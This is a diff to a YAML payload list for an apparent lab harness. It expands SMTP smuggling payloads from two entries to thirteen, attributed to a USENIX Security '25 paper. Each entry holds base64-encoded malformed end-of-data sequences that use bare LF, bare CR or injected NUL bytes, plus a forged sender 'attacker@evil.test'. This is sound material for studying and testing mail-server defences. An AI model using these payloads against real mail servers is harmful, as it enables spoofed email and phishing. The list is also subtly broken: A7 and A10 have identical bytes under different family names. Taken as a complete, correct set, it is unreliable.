@@ -1,31 +1,107 @@
-# SMTP smuggling payloads — M0 subset (paper's A1 and A5)
-# Cross-ref: Wang et al., USENIX Security '25, Table 1
-# Bytes are base64-encoded to prevent line-ending normalization during transit.
-#
-# There is no "baseline terminator" payload in this list. A1 is literally
-# the research variant from Table 1 of the paper, not the RFC terminator.
-# The harness-level "can we deliver a plain email" sanity check is done
-# separately in tests/test_send.py using an empty smuggled_block.
+# SMTP smuggling payloads — full A1–A13 set from paper Table 1.
+# Cross-ref: Wang et al., USENIX Security '25, Table 1.
+# Bytes are base64-encoded to prevent line-ending normalization in transit.
 
 - id: A1
-  bytes_b64: "Ci4K"                  # "\n.\n"
+  bytes_b64: "Ci4K"
   family: bare-lf
   paper_ref: "Table 1, §3.1"
   scope: lab
   smuggled_sender: "attacker@evil.test"
   smuggled_subject: "SMUGGLED-A1"
-  description: |
-    Bare-LF dot bare-LF. Against a receiver that treats bare LF as line-end,
-    this terminates the DATA phase early and the bytes after it are parsed
-    as a second email.
+
+- id: A2
+  bytes_b64: "Ci4NCg=="
+  family: lf-dot-crlf
+  paper_ref: "Table 1"
+  scope: lab
+  smuggled_sender: "attacker@evil.test"
+  smuggled_subject: "SMUGGLED-A2"
+
+- id: A3
+  bytes_b64: "DS4N"
+  family: bare-cr
+  paper_ref: "Table 1"
+  scope: lab
+  smuggled_sender: "attacker@evil.test"
+  smuggled_subject: "SMUGGLED-A3"
+
+- id: A4
+  bytes_b64: "DS4NCg=="
+  family: cr-dot-crlf
+  paper_ref: "Table 1"
+  scope: lab
+  smuggled_sender: "attacker@evil.test"
+  smuggled_subject: "SMUGGLED-A4"
 
 - id: A5
-  bytes_b64: "DQouCg=="              # "\r\n.\n"
+  bytes_b64: "DQouCg=="
   family: crlf-dot-lf
   paper_ref: "Table 1, §3.1"
   scope: lab
   smuggled_sender: "attacker@evil.test"
   smuggled_subject: "SMUGGLED-A5"
-  description: |
-    CRLF dot bare-LF. Mixed line endings; a receiver that completes the
-    DATA terminator on bare LF after CR dot will smuggle.
+
+- id: A6
+  bytes_b64: "DQouDQ=="
+  family: crlf-dot-cr
+  paper_ref: "Table 1"
+  scope: lab
+  smuggled_sender: "attacker@evil.test"
+  smuggled_subject: "SMUGGLED-A6"
+
+- id: A7
+  bytes_b64: "AA0KLg0K"
+  family: nul-prefix
+  paper_ref: "Table 1"
+  scope: lab
+  smuggled_sender: "attacker@evil.test"
+  smuggled_subject: "SMUGGLED-A7"
+
+- id: A8
+  bytes_b64: "DQoALg0K"
+  family: nul-before-dot
+  paper_ref: "Table 1"
+  scope: lab
+  smuggled_sender: "attacker@evil.test"
+  smuggled_subject: "SMUGGLED-A8"
+
+- id: A9
+  bytes_b64: "DQAKLg0K"
+  family: nul-in-terminator
+  paper_ref: "Table 1"
+  scope: lab
+  smuggled_sender: "attacker@evil.test"
+  smuggled_subject: "SMUGGLED-A9"
+
+- id: A10
+  bytes_b64: "AA0KLg0K"
+  family: nul-prefix-variant
+  paper_ref: "Table 1"
+  scope: lab
+  smuggled_sender: "attacker@evil.test"
+  smuggled_subject: "SMUGGLED-A10"
+
+- id: A11
+  bytes_b64: "DQouAA0K"
+  family: nul-after-dot
+  paper_ref: "Table 1"
+  scope: lab
+  smuggled_sender: "attacker@evil.test"
+  smuggled_subject: "SMUGGLED-A11"
+
+- id: A12
+  bytes_b64: "DQouDQAK"
+  family: nul-in-trailing-crlf
+  paper_ref: "Table 1"
+  scope: lab
+  smuggled_sender: "attacker@evil.test"
+  smuggled_subject: "SMUGGLED-A12"
+
+- id: A13
+  bytes_b64: "DQouDQoA"
+  family: nul-suffix
+  paper_ref: "Table 1"
+  scope: lab
+  smuggled_sender: "attacker@evil.test"
+  smuggled_subject: "SMUGGLED-A13"
